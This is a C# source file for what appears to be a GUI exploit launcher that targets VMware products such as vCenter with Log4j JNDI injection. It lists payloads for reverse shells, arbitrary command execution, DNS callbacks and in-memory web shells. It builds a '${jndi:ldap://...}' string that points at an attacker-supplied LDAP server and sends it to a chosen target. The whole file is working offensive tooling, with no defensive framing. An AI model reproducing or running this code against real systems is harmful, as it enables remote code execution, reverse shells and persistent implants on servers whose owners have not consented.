using System;
using System.Threading;
using System.Web;
using System.Windows.Forms;
using Vm4j_exp.ExecPayload;

namespace Vm4j_exp
{
    public partial class Form1 : Form
    {
        Log log = new Log();
        public static Form1 form = null;

        public delegate bool CheckAliveCallback(string url);
        //payload array
        private string[] BasicPayloadsArray = new string[] { "Dnslog/[domain]", "Command/[cmd]", "Command/Base64/[base64_encoded_cmd]", "ReverseShell/[ip]/[port]", "TomcatEcho", "SpringEcho", "WeblogicEcho", "TomcatMemshell1", "TomcatMemshell2", "JettyMemshell", "WeblogicMemshell1", "WeblogicMemshell2", "JBossMemshell", "WebsphereMemshell", "SpringMemshell" };
        private string[] DeserializationPayloadsArray = new string[] { "URLDNS/[domain]", "CommonsCollectionsK1/Dnslog/[domain]", "CommonsCollectionsK2/Command/Base64/[base64_encoded_cmd]", "CommonsBeanutils1/ReverseShell/[ip]/[port]", "CommonsBeanutils2/TomcatEcho", "C3P0/SpringEcho", "Jdk7u21/WeblogicEcho", "Jre8u20/TomcatMemshell", "CVE_2020_2555/WeblogicMemshell1", "CVE_2020_2883/WeblogicMemshell2" };
        private string[] TomcatBypassPayloadsArray = new string[] { "Dnslog/[domain]", "Command/[cmd]", "Command/Base64/[base64_encoded_cmd]", "ReverseShell/[ip]/[port]", "TomcatEcho", "SpringEcho", "TomcatMemshell1", "TomcatMemshell2", "SpringMemshell" };
        private string[] GroovyBypassPayloadsArray = new string[] { "Command/[cmd]", "Command/Base64/[base64_encoded_cmd]" };
        private string[] WebsphereBypassPayloadsArray = new string[] { "List/file=[file_or_directory]", "Upload/Dnslog/[domain]", "Upload/Command/[cmd]", "Upload/Command/Base64/[base64_encoded_cmd]", "Upload/ReverseShell/[ip]/[port]", "Upload/WebsphereMemshell", "RCE/path=[uploaded_jar_path]" };
        private string finalPayloadTmp = "${{jndi:ldap://{0}/{1}/{2}}}";
        private string finalPayload;
        private string gadget, reverseIp,payload, command, targetAddr;
        public Form1()
        {
            InitializeComponent();
            form = this;
        }
        private void TargetInputBox_TextChanged(object sender, EventArgs e)
        {
            ProductListBox.Enabled= true;
        }

        private void ProductListBox_SelectedValueChanged(object sender, EventArgs e)
        {
            log.LogInfo("Product set to " + ProductListBox.SelectedItem.ToString());
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            log.LogInfo("Welcome Back");
        }
        //gadgetbox event
        private void gadgetBox_SelectedValueChanged(object sender, EventArgs e)
        {
            payloadBox.Items.Clear();
            string selectedGadget = gadgetBox.SelectedItem.ToString();
            gadget = selectedGadget;
            log.LogInfo("* Gadget set to " + selectedGadget);
            payloadBox.Enabled=true;
            switch (selectedGadget)
            {
                case "Basic":
                    foreach (var item in BasicPayloadsArray)
                    {
                        payloadBox.Items.Add(item);
                    }
                    break;
                case "Deserialization":
                    foreach (var item in DeserializationPayloadsArray)
                    {
                        payloadBox.Items.Add(item);
                    }
                    break;
                case "TomcatBypass":
                    foreach (var item in TomcatBypassPayloadsArray)
                    {
                        payloadBox.Items.Add(item);
                    }
                    break;
                case "GroovyBypass":
                    foreach (var item in GroovyBypassPayloadsArray)
                    {
                        payloadBox.Items.Add(item);
                    }
                    break;
                case "WebsphereBypass":
                    foreach (var item in WebsphereBypassPayloadsArray)
                    {
                        payloadBox.Items.Add(item);
                    }
                    break;

                default:
                    break;
            }
        }
        //payloadbox event
        private void payloadBox_SelectedValueChanged(object sender, EventArgs e)
        {
            string selectedPayload = payloadBox.SelectedItem.ToString();
            payload = selectedPayload;
            string lowerPayload = payloadBox.SelectedItem.ToString().ToLower();
            if (lowerPayload.Contains("command") ||
                lowerPayload.Contains("echo") ||
                lowerPayload.Contains("dns") ||
                lowerPayload.Contains("reverseshell")
                )
            {
                cmdBox.Enabled = true;
                if (lowerPayload.Contains("dns"))
                {
                    cmdlabel.Text = "Domain";
                }else if (lowerPayload.Contains("reverseshell"))
                {
                    cmdlabel.Text = "Reverse\nServer";
                }
                else
                {
                    cmdlabel.Text = "Command";
                }
            }
            else
            {
                cmdBox.Enabled = false;
            }
            log.LogInfo("* Payload set to " + selectedPayload);
        }
        //sendbtn
        private void sendBtn_Click(object sender, EventArgs e)
        {
            sendBtn.Enabled = false;
            sendBtn.Text = "Running...";
            bool cacResult;
            if (string.IsNullOrEmpty(targetBox.Text))
            {
                MessageBox.Show("Target address is empty!", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                sendBtn.Enabled = true;
                sendBtn.Text = "Send";
                return;
            }
            targetAddr = targetBox.Text;
            if (string.IsNullOrEmpty(SvrIpBox.Text))
            {
                MessageBox.Show("Reverse address is empty!", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                sendBtn.Enabled = true;
                sendBtn.Text = "Send";
                return;
            }
            reverseIp = SvrIpBox.Text;
            try
            {
                CheckAliveCallback cac = new CheckAliveCallback(Tools.CheckTargetAlive);
                IAsyncResult ar = cac.BeginInvoke(targetAddr, null, null);
                while (!ar.IsCompleted)
                {
                    log.LogInfo("Checking target alive...");
                    Thread.Sleep(1000);
                }
                cacResult = cac.EndInvoke(ar);
            }
            catch (Exception ex)
            {
                log.LogError("Get Error:"+ ex.Message);
                sendBtn.Enabled = true;
                sendBtn.Text = "Send";
                return;
            }
            if (cacResult)
            {
                log.LogSuccess("Target is alive.");
                string lowerPayload = payloadBox.SelectedItem.ToString().ToLower();
                string selectedPayload = payloadBox.SelectedItem.ToString();
                string echoResult;
                string product = ProductListBox.SelectedItem.ToString();
                if (cmdBox.Enabled == true)
                {
                    if (lowerPayload.Contains("base64"))
                    {
                        if (string.IsNullOrEmpty(cmdBox.Text))
                        {
                            MessageBox.Show("Command is empty!", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                            sendBtn.Enabled = true;
                            sendBtn.Text = "Send";
                            return;
                        }
                        string _command = Tools.Base64Encode(cmdBox.Text);
                        command = HttpUtility.UrlEncode(_command);
                        string _finalPayload = string.Format(finalPayloadTmp, reverseIp, gadget, selectedPayload);
                        finalPayload = _finalPayload.Replace("[base64_encoded_cmd]", command);
                        Tools.ExecBlindPayload(targetAddr,finalPayload,product);
                        
                    }
                    else if (lowerPayload.Contains("reverseshell"))
                    {

                        if (string.IsNullOrEmpty(cmdBox.Text))
                        {
                            MessageBox.Show("Reverse Shell Address is empty!", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                            sendBtn.Enabled = true;
                            sendBtn.Text = "Send";
                            return;
                        }
                        string ip, port;
                        try
                        {
                            ip = cmdBox.Text.Split(':')[0];
                            port = cmdBox.Text.Split(':')[1];
                        }
                        catch (Exception)
                        {
                            log.LogError("IP/Port split failed.");
                            return;
                        }
                        string _finalPayload = string.Format(finalPayloadTmp, reverseIp, gadget, selectedPayload);
                        finalPayload = _finalPayload.Replace("[ip]", ip);
                        finalPayload = finalPayload.Replace("[port]", port);
                        Tools.ExecBlindPayload(targetAddr, finalPayload, product);
                    }
                    else if (lowerPayload.Contains("dns"))
                    {

                        if (string.IsNullOrEmpty(cmdBox.Text))
                        {
                            MessageBox.Show("Domain is empty!", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                            sendBtn.Enabled = true;
                            sendBtn.Text = "Send";
                            return;
                        }
                        string domain;
                        domain = HttpUtility.UrlEncode(cmdBox.Text);
                        string _finalPayload = string.Format(finalPayloadTmp, reverseIp, gadget, selectedPayload);
                        finalPayload = _finalPayload.Replace("[domain]", domain);
                        Tools.ExecBlindPayload(targetAddr, finalPayload, product);
                    }
                    else if (lowerPayload.Contains("[cmd]"))
                    {
                        if (string.IsNullOrEmpty(cmdBox.Text))
                        {
                            MessageBox.Show("Command is empty!", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                            sendBtn.Enabled = true;
                            sendBtn.Text = "Send";
                            return;
                        }
                        string cmd;
                        cmd = HttpUtility.UrlEncode(cmdBox.Text);
                        string _finalPayload = string.Format(finalPayloadTmp, reverseIp, gadget, selectedPayload);
                        finalPayload = _finalPayload.Replace("[cmd]", cmd);
                        Tools.ExecBlindPayload(targetAddr, finalPayload, product);
                    }
                    else if (lowerPayload.Contains("echo"))
                    {
                        if (string.IsNullOrEmpty(cmdBox.Text))
                        {
                            MessageBox.Show("Command is empty!", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                            sendBtn.Enabled = true;
                            sendBtn.Text = "Send";
                            return;
                        }
                        string cmd;
                        cmd = HttpUtility.UrlEncode(cmdBox.Text);
                        string _finalPayload = string.Format(finalPayloadTmp, reverseIp, gadget, selectedPayload);
                        finalPayload = _finalPayload;
                        Tools.ExecEchoPayload(targetAddr, finalPayload,cmd, product);
                    }
                    sendBtn.Enabled = true;
                    sendBtn.Text = "Send";
                }
                else
                {
                    string _finalPayload = string.Format(finalPayloadTmp, reverseIp, gadget, selectedPayload);
                    finalPayload = _finalPayload;
                    switch (ProductListBox.SelectedItem)
                    {
                        case "VMware HCX":

                            break;
                        case "VMware vCenter":
                            log.LogSuccess("We will use JNDI payload " + finalPayload + " to exploit" + ProductListBox.SelectedItem);
                            echoResult = VCenter.VCenterExec(targetAddr, finalPayload);
                            if (echoResult != null)
                            {
                                log.LogSuccess("Exploit success,no echo payload.");
                            }
                            log.LogSuccess("Exploit Success.");
                            break;
                        case "VMware Workspace One":
                            break;
                        case "VMware NSX":
                            break;
                        case "VMware Horizon":
                            break;
                        case "VMware vRealize Operations Manager":
                            break;
                    }
                }
            }
            else
            {
                log.LogWarning("Target is not alive.");
                sendBtn.Enabled = true;
                sendBtn.Text = "Send";
                return;
            }
        }
    }
}
